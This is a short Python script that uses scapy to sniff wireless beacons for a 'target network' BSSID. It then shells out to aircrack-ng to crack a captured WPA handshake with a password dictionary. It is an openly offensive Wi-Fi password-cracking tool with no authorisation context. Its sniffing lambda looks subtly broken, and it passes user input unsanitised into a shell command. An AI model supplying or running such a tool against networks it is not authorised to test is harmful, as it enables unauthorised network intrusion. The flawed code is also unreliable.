from scapy.all import *
from os import system

# Function to capture BSSID of the target network
def get_bssid(interface, essid):
    print("Scanning for wireless networks...")
    sniff(iface=interface, prn=lambda x:x.sprintf("{Dot11Beacon:%Dot11.addr3%\n%Dot11Beacon.info%}\n").\
      split("\n"), timeout=10)
    print("\nSelect the BSSID of the target network:")
    bssid = input()
    return bssid

# Function to crack the handshake
def crack_handshake(bssid, capture_file, dictionary_file):
    system(f"aircrack-ng -b {bssid} -w {dictionary_file} {capture_file}")

# User inputs
interface = input("Enter the name of your wireless interface (e.g., wlan0): ")
essid = input("Enter the name of the target network (ESSID): ")
capture_file = input("Enter the name of the capture file (PCAP format): ")
dictionary_file = input("Enter the name of the dictionary file (text file): ")

# Get BSSID of the target network
bssid = get_bssid(interface, essid)

# Crack the handshake using the captured BSSID and dictionary
crack_handshake(bssid, capture_file, dictionary_file)
